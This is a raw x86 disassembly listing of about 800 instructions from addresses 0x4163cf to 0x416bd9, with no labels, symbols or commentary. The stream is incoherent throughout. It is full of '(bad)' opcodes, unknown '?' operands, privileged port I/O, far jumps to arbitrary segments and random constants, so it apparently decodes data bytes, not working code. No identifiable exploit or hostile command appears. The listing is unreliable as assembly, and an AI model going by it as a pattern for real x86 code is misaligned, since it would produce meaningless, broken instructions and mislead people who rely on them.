  4163cf:	adc    bh,BYTE PTR [esi]
  4163d1:	add    al,0x99
  4163d3:	in     eax,dx
  4163d4:	fucomp st(7)
  4163d6:	push   ebp
  4163d7:	popf   
  4163d8:	jmp    0x1a0a3636
  4163dd:	cmc    
  4163de:	sbb    DWORD PTR [ebx+0x74],edi
  4163e1:	(bad)  
  4163e2:	xchg   edx,eax
  4163e3:	aad    0xfb
  4163e5:	imul   esp,ebx,0x2ce0a66c
  4163eb:	and    BYTE PTR [edx-0x41cf93de],bh
  4163f1:	pop    es
  4163f2:	push   esp
  4163f3:	pop    edi
  4163f4:	into   
  4163f5:	push   edi
  4163f6:	xor    BYTE PTR [esi],0xe
  4163f9:	mov    edx,0x96d1bcb6
  4163fe:	rcl    DWORD PTR [ecx+0x4d],0x97
  416402:	jb     0x41647a
  416404:	jecxz  0x4163d5
  416406:	or     DWORD PTR [ebx],edi
  416408:	addr16 pop esi
  41640a:	loopne 0x416479
  41640c:	sub    DWORD PTR [eax-0x6ff74a2f],ecx
  416412:	lock sti 
  416414:	jnp    0x416407
  416416:	xchg   esi,eax
  416417:	es call 0x29f4:0x3e7a8a51
  41641f:	cmp    BYTE PTR [ebx-0x57],bh
  416422:	xchg   ecx,eax
  416423:	sbb    BYTE PTR [edi],dl
  416425:	mov    ds:0x854a399a,al
  41642a:	sub    eax,0x6227f3f3
  41642f:	ds sbb al,0x9d
  416432:	mov    BYTE PTR [ebx],dh
  416434:	inc    eax
  416435:	pop    edx
  416436:	pop    esi
  416437:	add    DWORD PTR [edi+0x67fcff6],0x58122224
  416441:	in     eax,dx
  416442:	loop   0x4163d3
  416444:	xchg   BYTE PTR [ebx],al
  416446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416447:	adc    eax,ebx
  416449:	mov    ebp,0x65fc8899
  41644e:	ins    BYTE PTR es:[edi],dx
  41644f:	out    0xc5,eax
  416451:	loopne 0x416424
  416453:	in     al,dx
  416454:	imul   ebp,DWORD PTR [ebx],0x80e40855
  41645a:	call   0xe356:0x7dd458ea
  416461:	outs   dx,DWORD PTR ds:[esi]
  416462:	pushf  
  416463:	rcl    DWORD PTR [esi],1
  416465:	xchg   esi,eax
  416466:	push   esi
  416467:	aam    0xcb
  416469:	enter  0x18da,0x5a
  41646d:	pop    edi
  41646e:	out    dx,eax
  41646f:	mov    esi,0xe3407da5
  416474:	dec    DWORD PTR [edx+0x33]
  416477:	pop    ebp
  416478:	popa   
  416479:	retf   0x8f7d
  41647c:	inc    eax
  41647d:	mov    ds:0xd117f643,al
  416482:	clc    
  416483:	scas   eax,DWORD PTR es:[edi]
  416484:	bound  ebx,QWORD PTR [ebx]
  416486:	mov    edi,DWORD PTR [ecx+ecx*4+0x4bc2a341]
  41648d:	xchg   ebx,eax
  41648e:	and    cl,BYTE PTR [esi+esi*2]
  416491:	cmp    eax,0x6dc1a5aa
  416496:	in     al,0xa5
  416498:	pop    edi
  416499:	iret   
  41649a:	xor    DWORD PTR [ebp-0x2a],edi
  41649d:	call   0xaa91:0x6fc05b62
  4164a4:	cli    
  4164a5:	(bad)  
  4164a6:	mov    ds:0x8ae5529c,eax
  4164ab:	sub    DWORD PTR [ebx],edx
  4164ad:	and    eax,0xc1e9af33
  4164b2:	sub    cl,BYTE PTR [ebp+0x0]
  4164b5:	mov    cl,0x5a
  4164b7:	adc    al,0x5a
  4164b9:	inc    edi
  4164ba:	dec    ebp
  4164bb:	out    dx,al
  4164bc:	push   0xffffffa7
  4164be:	sahf   
  4164bf:	retf   0x2439
  4164c2:	inc    BYTE PTR ds:0x2f51586d
  4164c8:	xor    al,bl
  4164ca:	sti    
  4164cb:	push   esi
  4164cc:	addr16 jmp 0x52fe:0xb5b50d61
  4164d4:	push   ecx
  4164d5:	iret   
  4164d6:	jmp    0x416540
  4164d8:	inc    ecx
  4164da:	adc    DWORD PTR [ebx],esp
  4164dc:	lods   al,BYTE PTR ds:[esi]
  4164dd:	fdecstp 
  4164df:	gs int3 
  4164e1:	xchg   ebp,eax
  4164e2:	out    0x0,al
  4164e4:	cdq    
  4164e5:	pop    esi
  4164e6:	ja     0x416510
  4164e8:	int    0x3d
  4164ea:	js     0x416502
  4164ec:	lods   al,BYTE PTR ds:[esi]
  4164ed:	mov    cl,0xf6
  4164ef:	and    esi,DWORD PTR [ecx+ebx*2-0x249c4d25]
  4164f6:	fcomp  DWORD PTR [edi+0x6a]
  4164f9:	aam    0xc9
  4164fb:	aad    0x50
  4164fd:	and    eax,0x97b0e7ac
  416502:	aam    0x46
  416504:	inc    esp
  416505:	into   
  416506:	or     DWORD PTR [esi-0x3da42f2d],eax
  41650c:	or     cl,BYTE PTR [esi-0x26]
  41650f:	cmp    eax,DWORD PTR [eax]
  416511:	sbb    dh,BYTE PTR [ebx-0x2b]
  416514:	mov    bl,0x16
  416516:	pop    ds
  416517:	sub    ch,BYTE PTR [esi]
  416519:	inc    edi
  41651a:	xchg   ecx,eax
  41651b:	test   DWORD PTR [edx],ecx
  41651d:	popf   
  41651e:	pop    ss
  41651f:	add    edx,DWORD PTR [edx+0xc]
  416522:	mov    esi,0x32411e7d
  416527:	sar    DWORD PTR [ecx+0x7bf55de7],1
  41652d:	mov    ch,0xb4
  41652f:	sbb    eax,0x8ec7b2fd
  416534:	(bad)  
  416535:	scas   eax,DWORD PTR es:[edi]
  416536:	push   eax
  416537:	mov    DWORD PTR [eax-0x45],ebp
  41653a:	dec    edi
  41653b:	sbb    bh,BYTE PTR [esp+edx*2]
  41653e:	push   ss
  41653f:	or     edx,ebp
  416541:	cmp    ebp,esp
  416543:	ins    DWORD PTR es:[edi],dx
  416544:	mov    bh,0x15
  416546:	inc    esp
  416547:	fmul   DWORD PTR [ebp-0x68]
  41654a:	test   BYTE PTR [esp+eax*8-0x3174c530],bl
  416551:	stc    
  416552:	inc    ecx
  416553:	jecxz  0x4164db
  416555:	jg     0x4165a3
  416557:	jns    0x4164f3
  416559:	bound  edx,QWORD PTR [edi+eiz*8+0x5e]
  41655d:	inc    edi
  41655e:	cli    
  41655f:	xor    ecx,ebp
  416561:	into   
  416562:	mov    ds:0x7a572c72,al
  416567:	aas    
  416568:	and    ecx,DWORD PTR [ebp-0x19897663]
  41656e:	arpl   WORD PTR ds:0xdb73e009,bp
  416574:	inc    edx
  416575:	dec    edx
  416576:	sbb    esi,0xffffff91
  416579:	pop    ecx
  41657a:	mov    ebp,0xfe0fea4a
  41657f:	jb     0x41650e
  416581:	test   BYTE PTR [ecx+0x9f93cab],ch
  416587:	add    al,0xb1
  416589:	fild   QWORD PTR [ecx]
  41658b:	fwait
  41658c:	popf   
  41658d:	adc    eax,0xe5e31d07
  416592:	push   esi
  416593:	adc    DWORD PTR [edi],ebx
  416595:	lds    esi,FWORD PTR [ebp+0x5]
  416598:	mov    dh,0x88
  41659a:	xor    bl,ch
  41659c:	out    0x7e,al
  41659e:	mov    ch,0x25
  4165a0:	cdq    
  4165a1:	arpl   sp,ax
  4165a3:	jns    0x416529
  4165a5:	in     eax,0x15
  4165a7:	jmp    0xfa65:0x731284e5
  4165ae:	push   0xffffffa3
  4165b0:	dec    edx
  4165b1:	(bad)  
  4165b2:	mov    edi,0x4595b43c
  4165b7:	ds (bad) 
  4165b9:	dec    ebx
  4165ba:	mov    WORD PTR [esi],ds
  4165bc:	cmp    eax,0x3a29a367
  4165c1:	jno    0x4165ee
  4165c3:	push   ds
  4165c4:	push   edi
  4165c5:	and    eax,0x5bdb6144
  4165ca:	fbld   TBYTE PTR [eax-0x15]
  4165cd:	or     al,0x7b
  4165cf:	rep lods al,BYTE PTR ds:[esi]
  4165d1:	or     DWORD PTR [esi+0x36],ebx
  4165d4:	cmp    ecx,DWORD PTR [edx+0x158ae62]
  4165da:	lock (bad) 
  4165dd:	dec    esi
  4165de:	mov    bh,0x81
  4165e0:	push   0xfffffffc
  4165e2:	mov    edx,ebp
  4165e4:	aaa    
  4165e5:	out    0x22,eax
  4165e7:	aad    0xc0
  4165e9:	(bad)  
  4165ea:	jmp    0x4165bc
  4165ec:	and    bl,al
  4165ee:	js     0x416620
  4165f0:	inc    ebp
  4165f1:	jp     0x416637
  4165f3:	or     cl,BYTE PTR [ecx]
  4165f5:	shl    BYTE PTR [ebp+0x7bf50192],cl
  4165fb:	xor    DWORD PTR ds:0x76f6b591,edx
  416601:	inc    ebp
  416602:	aam    0x2b
  416604:	add    esi,ecx
  416606:	lock xchg ebp,eax
  416608:	mov    BYTE PTR [eax-0x51],ch
  41660b:	and    edx,ebp
  41660d:	repnz shl BYTE PTR [ecx+edx*2-0x19],1
  416612:	xchg   sp,ax
  416614:	or     dh,ch
  416616:	cdq    
  416617:	cdq    
  416618:	jmp    0x8d36:0x98b0b723
  41661f:	rcr    DWORD PTR [ebx],0xe
  416622:	daa    
  416623:	sbb    al,0x97
  416625:	and    cl,BYTE PTR [ebp+0x49]
  416628:	imul   edi,edx,0xffffffc9
  41662b:	push   0xeb0001df
  416630:	fidivr WORD PTR [edx]
  416632:	sbb    eax,0x4df9cc51
  416637:	cmc    
  416638:	stc    
  416639:	stc    
  41663a:	xor    ebp,DWORD PTR [edx-0x4ac9e463]
  416640:	(bad)  
  416642:	fadd   QWORD PTR [edi]
  416644:	inc    esi
  416645:	cmp    al,0x27
  416647:	int3   
  416648:	dec    esi
  416649:	in     al,dx
  41664a:	push   edx
  41664b:	xlat   BYTE PTR ds:[ebx]
  41664c:	mov    dh,BYTE PTR [ebx]
  41664e:	lahf   
  41664f:	cdq    
  416650:	push   edx
  416651:	mov    ds:0x38e27547,eax
  416656:	dec    ebp
  416657:	jmp    0xf099067e
  41665c:	(bad)  
  41665d:	sub    esi,0xffffff92
  416660:	mov    DWORD PTR gs:[edx+0x6c],ebx
  416664:	and    DWORD PTR cs:[esi-0x2387dfba],esp
  41666b:	arpl   WORD PTR [edi+0x2ac3710a],dx
  416671:	fld    DWORD PTR [esi]
  416673:	stc    
  416674:	pop    ds
  416675:	mov    bh,0x1f
  416677:	push   esp
  416678:	adc    ah,BYTE PTR [ebx-0xf]
  41667b:	xchg   ecx,eax
  41667c:	clc    
  41667d:	cs mov esi,0x7a9212f5
  416683:	mov    edi,DWORD PTR [eax-0x10fa639c]
  416689:	cmp    al,0x92
  41668b:	outs   dx,BYTE PTR ds:[esi]
  41668c:	fwait
  41668d:	lods   eax,DWORD PTR ds:[esi]
  41668e:	sub    edx,DWORD PTR [esi+0x5f2ec194]
  416694:	jle    0x41666a
  416696:	retf   0xba3e
  416699:	push   cs
  41669a:	mov    cl,0xd2
  41669c:	jge    0x41668c
  41669e:	leave  
  41669f:	icebp  
  4166a0:	out    dx,al
  4166a1:	mov    ecx,0x77bd0a8f
  4166a6:	mov    ds:0xac4b0800,al
  4166ab:	bound  edx,QWORD PTR [esp+edi*4-0x21]
  4166af:	mov    ebx,esi
  4166b1:	rcl    DWORD PTR [eax],1
  4166b3:	mul    DWORD PTR [esi]
  4166b5:	adc    bh,dh
  4166b7:	jecxz  0x416648
  4166b9:	jno    0x41663c
  4166bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166bc:	mov    ch,BYTE PTR ds:0x4ff69f93
  4166c2:	sub    ebx,eax
  4166c4:	sti    
  4166c5:	sbb    DWORD PTR [esi],0xfffffff9
  4166c8:	call   0xbeac:0x50ca6ce
  4166cf:	adc    DWORD PTR ds:0x31b06a33,ecx
  4166d5:	xchg   ebx,eax
  4166d6:	lods   al,BYTE PTR ds:[esi]
  4166d7:	pop    esp
  4166d9:	mov    ch,BYTE PTR [ebx+0x5]
  4166dc:	fcomp  QWORD PTR [edi+0x23]
  4166df:	xchg   DWORD PTR es:[esi-0x528ee65d],eax
  4166e6:	and    al,0x95
  4166e8:	ror    BYTE PTR [ebx],0xcf
  4166eb:	sub    al,bh
  4166ed:	dec    ebx
  4166ee:	popa   
  4166ef:	js     0x4166c4
  4166f1:	jno    0x416714
  4166f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f4:	mov    bl,BYTE PTR [ebp+0x2c2b38d4]
  4166fa:	pop    eax
  4166fb:	mov    cl,0xd0
  4166fd:	fisttp WORD PTR [eax-0x3c7aa5f1]
  416703:	enter  0x38e3,0x54
  416707:	outs   dx,BYTE PTR ds:[esi]
  416708:	jmp    0xd4d2:0x42bf3b4e
  41670f:	popa   
  416710:	dec    esp
  416711:	mov    al,ds:0x84b83913
  416716:	cdq    
  416717:	ret    
  416718:	mov    eax,0x48e98608
  41671d:	adc    bl,BYTE PTR [edx]
  41671f:	enter  0x89bc,0xd0
  416723:	cs pop ecx
  416725:	lds    esi,FWORD PTR [edx]
  416727:	sbb    al,0xc0
  416729:	sbb    eax,0x8a42d3ca
  41672e:	pop    ebp
  41672f:	int    0x6b
  416731:	(bad)  
  416734:	adc    al,0x3
  416736:	jecxz  0x416752
  416738:	inc    ebp
  416739:	jne    0x416730
  41673b:	daa    
  41673c:	data16 cld 
  41673e:	pop    ss
  41673f:	mov    ah,0xb1
  416741:	repz adc al,0x53
  416744:	popa   
  416745:	jnp    0x416735
  416747:	jl     0x4167af
  416749:	out    0x29,al
  41674b:	and    dh,bl
  41674d:	jnp    0x4166d1
  41674f:	call   0xb504fd7b
  416754:	sub    dh,BYTE PTR [ecx]
  416756:	xor    DWORD PTR ds:0xbc76f4b6,esi
  41675c:	pop    esp
  41675d:	push   ebx
  41675e:	sub    BYTE PTR [edx+0x1b],0x15
  416762:	dec    eax
  416763:	pop    esi
  416764:	cmp    DWORD PTR [ebp+0x20a3292d],eax
  41676a:	adc    DWORD PTR [ebx],edx
  41676c:	aaa    
  41676d:	sbb    al,0x7d
  41676f:	or     bl,bh
  416771:	ss and al,0x4a
  416774:	out    dx,al
  416775:	and    edi,DWORD PTR [ecx+ebx*4+0x44b63a5c]
  41677c:	imul   ebp,DWORD PTR [eax],0xf45b50da
  416782:	push   ebp
  416783:	gs add eax,0xa1a4f47e
  416789:	push   edx
  41678a:	je     0x41677c
  41678c:	xor    ah,BYTE PTR [eax+0x4db5092c]
  416792:	out    dx,al
  416793:	push   ebp
  416794:	dec    eax
  416795:	dec    eax
  416796:	out    0x39,ax
  416799:	ret    0x2168
  41679c:	inc    ecx
  41679d:	cli    
  41679e:	xchg   edx,eax
  41679f:	mov    WORD PTR [eax+0x76],?
  4167a2:	and    DWORD PTR [ebx+0x48722b70],ebp
  4167a8:	jmp    0x4b0d:0x3f4004be
  4167af:	pop    esp
  4167b0:	jnp    0x416753
  4167b2:	mov    ds:0xe0b9364f,al
  4167b7:	push   edx
  4167b8:	pop    eax
  4167b9:	jl     0x416792
  4167bb:	inc    ebx
  4167bc:	inc    esi
  4167bd:	mov    bh,0xc6
  4167bf:	(bad)  
  4167c0:	push   edx
  4167c1:	and    eax,0xfc059222
  4167c6:	push   ecx
  4167c7:	out    dx,eax
  4167c8:	div    esp
  4167ca:	out    dx,eax
  4167cb:	lock xchg edx,eax
  4167cd:	in     al,0x67
  4167cf:	push   ecx
  4167d0:	inc    ecx
  4167d1:	loope  0x4167d9
  4167d3:	mov    ebx,0x3be7a87
  4167d8:	dec    ecx
  4167d9:	or     eax,0x12094db6
  4167de:	les    eax,FWORD PTR [esp+ecx*1-0x9]
  4167e2:	loope  0x416823
  4167e4:	ins    BYTE PTR es:[edi],dx
  4167e5:	mov    WORD PTR [ebp+0x6d],cs
  4167e8:	fild   QWORD PTR [edx-0x11c0828d]
  4167ee:	mov    ds:0x322fc69,eax
  4167f3:	and    al,0xb6
  4167f5:	add    dl,BYTE PTR [esi]
  4167f7:	fadd   DWORD PTR [ebx+0x76]
  4167fa:	cmp    bh,ch
  4167fc:	mov    ah,0xe4
  4167fe:	(bad)  
  4167ff:	jge    0x4167e4
  416801:	sar    ecx,0x86
  416804:	ins    BYTE PTR es:[edi],dx
  416805:	shl    DWORD PTR [edx],cl
  416807:	pop    ss
  416808:	(bad)
  41680c:	adc    dl,al
  41680e:	call   eax
  416810:	test   al,0xcd
  416812:	test   al,0x24
  416814:	or     cl,ah
  416816:	sub    DWORD PTR [esi+0x69ac7ce9],ebp
  41681c:	xchg   esi,eax
  41681d:	cs jo  0x41683b
  416820:	scas   al,BYTE PTR es:[edi]
  416821:	add    ch,BYTE PTR [eax+0x59608dbb]
  416827:	ds std 
  416829:	mov    edx,0x2bf81e23
  41682e:	sub    eax,0xedcfaded
  416833:	je     0x416814
  416835:	imul   ebp,DWORD PTR [ecx],0xffffffed
  416838:	and    DWORD PTR [esi+0x29ea8609],ebp
  41683e:	xor    al,0xb1
  416840:	sbb    dh,BYTE PTR [edi+0x78ebe8b1]
  416846:	and    DWORD PTR [edi+0x5e794806],ebx
  41684c:	sbb    ebx,esi
  41684e:	test   al,0x88
  416850:	test   al,0x69
  416852:	inc    edi
  416853:	lds    edi,FWORD PTR [edx+0xa39cdd4]
  416859:	sbb    ah,al
  41685b:	fdivr  DWORD PTR [edx]
  41685d:	(bad)  
  41685e:	test   eax,0x11bf221f
  416863:	aaa    
  416864:	and    DWORD PTR [ebp-0x4ef64be],0x8fcd89f4
  41686e:	push   edx
  41686f:	jo     0x41685d
  416871:	pop    ebp
  416872:	icebp  
  416873:	pusha  
  416874:	stc    
  416875:	inc    esi
  416876:	add    al,0x2
  416878:	rol    BYTE PTR ds:0xcb9a040c,1
  41687e:	in     eax,0x69
  416880:	dec    ecx
  416881:	mov    bl,0xf1
  416883:	lea    ecx,[ecx]
  416885:	jl     0x416815
  416887:	mov    cl,0x6a
  416889:	lahf   
  41688a:	mov    ds:0x950c1ab3,al
  41688f:	cmc    
  416890:	fldcw  WORD PTR [esi]
  416892:	xor    DWORD PTR [edx+0x4b6fdbb2],edi
  416898:	jne    0x416840
  41689a:	jo     0x41686c
  41689c:	mov    al,0xe5
  41689e:	ret    
  41689f:	push   edi
  4168a0:	mov    dh,0xcd
  4168a2:	sbb    ebp,0x46
  4168a5:	inc    edx
  4168a6:	inc    ecx
  4168a7:	cmp    eax,0x3128b2c9
  4168ac:	jbe    0x41690a
  4168ae:	push   ebp
  4168af:	lea    ebp,[eax+0x53]
  4168b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b3:	rol    DWORD PTR [ecx-0x276218f0],1
  4168b9:	pop    edi
  4168ba:	in     al,0x1a
  4168bc:	cmp    dl,BYTE PTR [edx+0x2ae0f51c]
  4168c2:	aaa    
  4168c3:	in     al,0xe9
  4168c5:	sbb    al,0x92
  4168c7:	bound  eax,QWORD PTR [edx]
  4168c9:	jg     0x4168d6
  4168cb:	adc    edi,DWORD PTR [eax+0x37]
  4168ce:	push   eax
  4168cf:	mov    esi,0x9538a427
  4168d4:	adc    al,0x64
  4168d6:	jecxz  0x4168db
  4168d8:	inc    ebp
  4168d9:	xor    eax,0x47786bc3
  4168de:	xchg   BYTE PTR [eax],dl
  4168e0:	outs   dx,BYTE PTR ds:[esi]
  4168e1:	inc    esp
  4168e2:	xchg   ebx,eax
  4168e3:	pop    eax
  4168e4:	xchg   BYTE PTR [eax+eax*1-0x747e3f4d],ch
  4168eb:	jle    0x416949
  4168ed:	pop    ebp
  4168ee:	mov    ds:0x8ea03846,al
  4168f3:	test   eax,0x90b36d40
  4168f8:	and    dh,ch
  4168fa:	mov    bh,0x70
  4168fc:	and    eax,0x20561866
  416901:	adc    eax,0xb0653888
  416906:	push   ss
  416907:	pop    ecx
  416908:	les    ebx,FWORD PTR [ecx-0x51b20081]
  41690e:	int3   
  41690f:	push   0x4
  416911:	test   DWORD PTR [eax],ebx
  416913:	in     eax,dx
  416914:	jle    0x416941
  416916:	sti    
  416917:	sub    BYTE PTR [edi+0x0],0x96
  41691b:	pop    edx
  41691c:	cwde   
  41691d:	add    al,0x2c
  41691f:	inc    ebp
  416920:	mov    bh,0x39
  416922:	sbb    edi,DWORD PTR [esi+0x7f7eda8b]
  416928:	mov    ch,0x14
  41692a:	push   ds
  41692b:	out    0x1e,al
  41692d:	inc    ecx
  41692e:	jne    0x416930
  416930:	jmp    0x3765:0xaaeb3f59
  416937:	dec    eax
  416938:	out    0x8d,al
  41693a:	adc    dl,BYTE PTR [edi+edx*8+0x5dc7e243]
  416941:	mov    edi,0x49858bc8
  416946:	in     al,0x48
  416948:	cdq    
  416949:	jg     0x41692c
  41694b:	scas   al,BYTE PTR es:[edi]
  41694c:	pusha  
  41694d:	xchg   esi,eax
  41694e:	push   esp
  41694f:	cdq    
  416950:	inc    edi
  416951:	mov    eax,ds:0x79bd8f73
  416956:	mov    ebp,DWORD PTR [eax+0x2ca479cd]
  41695c:	jnp    0x416912
  41695e:	push   0x28d44e10
  416963:	mov    cl,0xa0
  416965:	imul   eax,DWORD PTR [ecx+0x3b522f7f],0x9948bd33
  41696f:	out    0x34,al
  416971:	mov    DWORD PTR [ecx-0x63],0xca290ec6
  416978:	mov    DWORD PTR [esi+ebx*4+0x40fc1b7b],edx
  41697f:	mov    ebx,0x8d0df129
  416984:	sbb    ax,0x605a
  416988:	jle    0x4169ba
  41698a:	adc    al,0x2c
  41698c:	rep outs dx,BYTE PTR ds:[esi]
  41698e:	pop    ebx
  41698f:	fbstp  TBYTE PTR [edi+eiz*2+0x74]
  416993:	data16 test al,0xc4
  416996:	in     al,dx
  416997:	sahf   
  416998:	push   eax
  416999:	mov    WORD PTR [edi+0x7d6b5d97],?
  41699f:	push   edx
  4169a0:	sbb    al,0x25
  4169a2:	xor    esp,DWORD PTR [eax+0x78a4aee4]
  4169a8:	imul   ecx,DWORD PTR [edi],0x3b
  4169ab:	inc    ebp
  4169ac:	cmp    ebp,DWORD PTR [edi+0x211da642]
  4169b2:	adc    bh,BYTE PTR [ebx-0x6e]
  4169b5:	mov    al,0x39
  4169b7:	imul   DWORD PTR [edx+0x366b1ab1]
  4169bd:	cmovle edx,DWORD PTR [edi-0x4a62a92e]
  4169c4:	or     cl,BYTE PTR [edx-0xe62075a]
  4169ca:	cmp    DWORD PTR [esi+0x4738c2bd],0xab7caecd
  4169d4:	inc    ecx
  4169d5:	adc    eax,0x1ed8c521
  4169da:	icebp  
  4169db:	inc    ebp
  4169dc:	xchg   BYTE PTR [edi+0x11],cl
  4169df:	call   0x4f9:0x8502fca7
  4169e6:	sub    al,0xba
  4169e8:	bound  ecx,QWORD PTR [esi+0x1f]
  4169eb:	loopne 0x416a17
  4169ed:	xchg   edx,eax
  4169ee:	mov    ch,0x64
  4169f0:	xchg   ebp,eax
  4169f1:	leave  
  4169f2:	pop    esp
  4169f3:	jp     0x416a27
  4169f5:	xor    al,0xd7
  4169f7:	add    edi,DWORD PTR [ecx-0x80]
  4169fa:	xchg   ebp,eax
  4169fb:	mov    ah,0x1c
  4169fd:	test   BYTE PTR [edi],al
  4169ff:	mov    eax,0x15288d1f
  416a04:	ror    DWORD PTR [ebp+0x14],1
  416a07:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416a09:	xchg   esi,eax
  416a0a:	adc    BYTE PTR [ebp+0xd],dh
  416a0d:	mov    ch,0x71
  416a0f:	mul    DWORD PTR [edi]
  416a11:	(bad)  
  416a12:	int    0xff
  416a14:	daa    
  416a15:	jns    0x4169ec
  416a17:	sbb    al,0xd0
  416a19:	sbb    BYTE PTR [esi],ah
  416a1b:	int    0xe9
  416a1d:	mov    ecx,fs
  416a1f:	xchg   ebp,eax
  416a20:	inc    edx
  416a21:	mov    ecx,0xbefe0809
  416a26:	shl    eax,cl
  416a28:	inc    edx
  416a29:	fdivr  QWORD PTR [edx+ebp*2]
  416a2c:	outs   dx,BYTE PTR ds:[esi]
  416a2d:	mov    ss,WORD PTR [ecx+esi*1-0x16]
  416a31:	test   esi,0x80ba307
  416a37:	dec    eax
  416a38:	mov    eax,0x252bccaa
  416a3d:	dec    ecx
  416a3e:	mov    ds:0xa276af15,eax
  416a43:	and    BYTE PTR [ebp+0x7],ch
  416a46:	repz inc eax
  416a48:	pop    ds
  416a49:	ins    BYTE PTR es:[edi],dx
  416a4a:	loop   0x416a8a
  416a4c:	mov    ebp,DWORD PTR [ebx+esi*1-0x22bb1fc9]
  416a53:	xor    eax,DWORD PTR [eax-0x6f0f38b0]
  416a59:	ficom  DWORD PTR [esi+0x55]
  416a5c:	mov    ds:0xb9af2121,eax
  416a61:	pusha  
  416a62:	adc    eax,0x83f5bb3f
  416a67:	dec    edx
  416a68:	dec    ecx
  416a69:	add    edx,ecx
  416a6b:	and    ebx,ebx
  416a6d:	imul   ebp,edx,0x9c7cc3d7
  416a73:	inc    edi
  416a74:	pop    esi
  416a75:	aam    0x1a
  416a77:	gs stos BYTE PTR es:[edi],al
  416a79:	int    0xa3
  416a7b:	stc    
  416a7c:	stos   BYTE PTR es:[edi],al
  416a7d:	into   
  416a7e:	xchg   esi,eax
  416a7f:	jp     0x416a73
  416a81:	int    0x45
  416a83:	(bad)  
  416a84:	call   DWORD PTR [edx+0x8e1492d]
  416a8a:	mov    ah,0xf9
  416a8c:	xchg   ebp,eax
  416a8d:	pop    ss
  416a8e:	das    
  416a8f:	pop    ecx
  416a90:	int    0xce
  416a92:	imul   esp,DWORD PTR gs:[ebx+0x57],0x1e
  416a97:	jae    0x416a75
  416a99:	in     al,0xe9
  416a9b:	push   0x3386a8a3
  416aa0:	lock sbb eax,0x7c452298
  416aa6:	dec    edx
  416aa7:	mov    esi,DWORD PTR [edi-0x6dad65b6]
  416aad:	popa   
  416aae:	jge    0x416ada
  416ab0:	adc    DWORD PTR [ebx-0x7ff26672],esi
  416ab6:	loope  0x416b25
  416ab8:	fnstcw WORD PTR [edx-0x23]
  416abb:	out    dx,al
  416abc:	jg     0x416a5d
  416abe:	push   es
  416abf:	jl     0x416b28
  416ac1:	test   ebp,0xb0803699
  416ac7:	cmp    dl,al
  416ac9:	rol    DWORD PTR [ebx+0x48a7f7d6],0x44
  416ad0:	add    ch,BYTE PTR [ecx+0x6994325a]
  416ad6:	data16 lahf 
  416ad8:	stc    
  416ad9:	loopne 0x416ab6
  416adb:	xchg   esp,eax
  416adc:	gs mov cl,bh
  416adf:	jp     0x416acf
  416ae1:	adc    al,0x0
  416ae3:	stos   BYTE PTR es:[edi],al
  416ae4:	cli    
  416ae5:	pop    edx
  416ae6:	sub    bh,BYTE PTR [ebp+0x7a]
  416ae9:	add    cl,BYTE PTR [edx-0x3dbba9f1]
  416aef:	sub    DWORD PTR [eax],0x18
  416af2:	xor    BYTE PTR [eax-0x41],bh
  416af5:	jp     0x416b06
  416af7:	test   DWORD PTR [edi],ecx
  416af9:	and    eax,0x23e66fa6
  416afe:	lods   al,BYTE PTR ds:[esi]
  416aff:	clc    
  416b00:	pop    ds
  416b01:	sub    eax,0x8348c09f
  416b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b07:	in     eax,0xdb
  416b09:	mov    al,0x84
  416b0b:	out    dx,al
  416b0c:	sub    al,0x19
  416b0e:	mov    ds:0x4b036210,al
  416b13:	dec    edx
  416b14:	data16 test bh,bl
  416b17:	lea    ebp,[esi+0x1a]
  416b1a:	mov    ds:0x4baa3f90,eax
  416b1f:	sbb    al,0x12
  416b21:	sbb    al,0xd7
  416b23:	sub    al,0xef
  416b25:	xor    al,0xfd
  416b27:	mov    esi,0x7539c12b
  416b2c:	mov    ds:0x102cfaff,al
  416b31:	jle    0x416ad8
  416b33:	jae    0x416b54
  416b35:	rcl    cl,0xc0
  416b38:	jmp    0x416b7d
  416b3a:	mov    WORD PTR cs:[edi+esi*4+0x34],?
  416b3f:	xor    esi,eax
  416b41:	or     ah,BYTE PTR [esi]
  416b43:	loop   0x416b8b
  416b45:	jns    0x416ba6
  416b47:	icebp  
  416b48:	cs or  al,0x96
  416b4b:	inc    esp
  416b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b4d:	push   ebp
  416b4e:	cli    
  416b4f:	mov    eax,ds:0x5695aa69
  416b54:	mov    esp,0x9b5ffbcf
  416b59:	out    0xcc,al
  416b5b:	mov    cl,BYTE PTR [ebp+ebx*8+0x671d955]
  416b62:	dec    eax
  416b63:	pop    edi
  416b64:	cli    
  416b65:	xchg   DWORD PTR [ebx-0x7e387997],edx
  416b6b:	mov    bl,0x9f
  416b6d:	fdivr  QWORD PTR [edi+0x47]
  416b70:	addr16 pop es
  416b72:	and    eax,0x55166e88
  416b77:	and    ah,BYTE PTR [eax]
  416b79:	call   0xc179ed6d
  416b7e:	aam    0x4a
  416b80:	jmp    0x2e4f5177
  416b85:	pop    es
  416b86:	inc    ebp
  416b87:	ficomp DWORD PTR [ebp-0x63a9c3ad]
  416b8d:	(bad)  
  416b8e:	fld    QWORD PTR [esi]
  416b90:	sti    
  416b91:	or     ah,bh
  416b93:	mov    dl,0x2a
  416b95:	jmp    0xdce1e905
  416b9a:	loopne 0x416beb
  416b9c:	scas   eax,DWORD PTR es:[edi]
  416b9d:	arpl   bx,cx
  416b9f:	pusha  
  416ba0:	mov    DWORD PTR [edx],esp
  416ba2:	cmp    DWORD PTR [edx+0x53],ebp
  416ba5:	fidivr DWORD PTR [ecx-0x4da295dd]
  416bab:	shr    DWORD PTR [ebp+eiz*1+0x7b46cbcd],1
  416bb2:	ret    0xad8b
  416bb5:	pop    ebp
  416bb6:	pop    ebx
  416bb7:	sahf   
  416bb8:	int3   
  416bb9:	dec    esi
  416bba:	fwait
  416bbb:	mov    cl,0xfe
  416bbd:	test   DWORD PTR ds:0x3ed5a654,edi
  416bc3:	sub    eax,0x7e295d36
  416bc8:	adc    edx,esi
  416bca:	push   esi
  416bcb:	push   0x2c7ab8a3
  416bd0:	pop    es
  416bd1:	cdq    
  416bd2:	popf   
  416bd3:	cmp    ch,dl
  416bd5:	mov    esi,ebp
  416bd7:	sub    bl,BYTE PTR [ebx]
  416bd9:	dec    edx
